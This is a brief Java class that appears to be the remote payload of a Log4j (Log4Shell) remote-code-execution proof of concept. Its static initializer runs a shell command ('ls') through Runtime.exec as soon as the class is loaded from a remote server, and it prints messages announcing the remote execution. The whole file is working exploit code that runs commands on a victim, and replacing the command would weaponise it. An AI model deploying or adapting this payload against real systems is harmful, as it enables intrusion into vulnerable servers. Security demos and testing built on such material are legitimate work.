package keeper.log4j.attack.attack;

public class AttackClass {

    static {
        System.out.println("I am Log4jRCE from remote!!!");
        try {
           String[] cmd = {"ls"};
            java.lang.Runtime.getRuntime().exec(cmd).waitFor();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public AttackClass(){
        System.out.println("I am Log4jRCE from remote222!!!");
    }
}
